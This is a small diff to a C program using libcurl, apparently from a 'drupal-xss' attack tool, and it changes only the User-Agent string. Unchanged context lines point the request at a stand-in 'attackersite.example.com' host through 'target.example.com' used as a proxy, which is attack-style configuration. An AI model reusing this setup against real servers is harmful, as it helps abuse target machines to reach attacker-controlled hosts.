@@ -11,7 +11,7 @@ int main(int argc, char *argv[])
   curl_easy_setopt(hnd, CURLOPT_URL, "http://attackersite.example.com:80/"); /* HTTP port optional */
   curl_easy_setopt(hnd, CURLOPT_PROXY, "http://target.example.com:80"); /* HTTP Port should be specified here */
   curl_easy_setopt(hnd, CURLOPT_NOPROGRESS, 1L);
-  curl_easy_setopt(hnd, CURLOPT_USERAGENT, "curl/7.21.6 (x86_64-pc-linux-gnu) libcurl/7.21.6 OpenSSL/1.0.0e zlib/1.2.3.4 libidn/1.22 librtmp/2.3");
+  curl_easy_setopt(hnd, CURLOPT_USERAGENT, "drupal-xss/1.0 (github.com/trinitronx/drupal-xss) libcurl/7.21.6 OpenSSL/1.0.0e zlib/1.2.3.4 libidn/1.22 librtmp/2.3");
   curl_easy_setopt(hnd, CURLOPT_MAXREDIRS, 50L);
   curl_easy_setopt(hnd, CURLOPT_VERBOSE, 1L);
 
